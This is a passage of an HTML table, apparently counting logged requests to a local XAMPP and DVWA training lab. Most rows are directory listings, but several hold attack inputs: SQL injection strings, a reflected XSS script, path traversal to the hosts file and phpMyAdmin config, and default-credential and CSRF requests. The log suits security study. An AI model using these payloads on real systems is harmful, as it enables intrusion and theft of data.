<http://192.168.56.101/dashboard/docs/images/send-mail/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/transfer-files-ftp/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-different-php-version/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-php-fcgi/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-sqlite/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/addons/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/blog/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/flags/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/screenshots/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/stamps/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/team/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/javascripts/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/images/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/instructions.php>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+union+select+user%28%29%2C+database%28%29+--+&Submit=Submit>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/icons/small/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+or+%271%27+%3D+%271&Submit=Submit>
</td>
<td style="text-align:right;">
3
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/configure-vhosts/?C=S;O=A>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/deploy-git-app/?C=D;O=A>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/install-wordpress/?C=M;O=A>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/transfer-files-ftp/?C=M;O=A>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/stylesheets/all.css>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/includes/?C=S;O=A>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/brute/>.
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=abc%27+and+0%3D0+union+select+table_name%2C+null+from+information_schema.tables+where+table_name+like+%22user%25%22--+&Submit=Submit>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/icons/?C=S;O=A>
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/applications.html>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/backup-restore-mysql.html>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/configure-vhosts.html>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/configure-wildcard-subdomains.html>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/deploy-git-app.html>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/configure-vhosts/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/configure-vhosts/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/deploy-git-app/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/deploy-git-app/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/install-wordpress/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/install-wordpress/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/reset-mysql-password/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/reset-mysql-password/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/reset-mysql-password/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/reset-mysql-password/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/send-mail/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/send-mail/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/send-mail/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/send-mail/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/transfer-files-ftp/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/transfer-files-ftp/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-different-php-version/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-different-php-version/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-different-php-version/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-different-php-version/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-php-fcgi/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-php-fcgi/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-php-fcgi/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-php-fcgi/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-sqlite/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-sqlite/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-sqlite/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/use-sqlite/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/install-wordpress.html>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/send-mail.html>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/transfer-files-ftp.html>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/use-sqlite.html>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/addons/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/addons/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/addons/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/addons/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/blog/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/blog/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/blog/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/blog/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/flags/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/flags/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/flags/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/flags/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/screenshots/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/screenshots/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/screenshots/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/screenshots/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/stamps/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/stamps/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/stamps/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/stamps/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/team/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/team/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/team/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/team/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/javascripts/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/javascripts/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/javascripts/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/javascripts/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/stylesheets/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/stylesheets/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/stylesheets/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/stylesheets/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/about.php>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/css/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/css/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/css/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/css/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/images/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/images/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/images/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/images/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/includes/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/includes/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/includes/DBMS/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/includes/DBMS/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/includes/DBMS/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/includes/DBMS/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/js/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/js/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/js/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/js/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/hackable/>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/ids_log.php>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/brute/>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/brute/>.?username=admin&Login=Login&password=password
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/brute/?username=admin&Login=Login&password=password>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/captcha/>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/captcha/>.
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/csrf/>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/csrf/>.
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/csrf/>.?password_conf=password&password_new=password&Change=Change&password_current=password
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/csrf/?password_conf=password&password_new=password&Change=Change&password_current=password>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/fi/?page=>../../../../../../../../abc.txt
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/fi/?page=>../../../../../../../../xampp/phpMyAdmin/config.inc
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/fi/?page=>../../../../../../windows/system32/drivers/etc/hosts
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=4&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=5&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=6&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
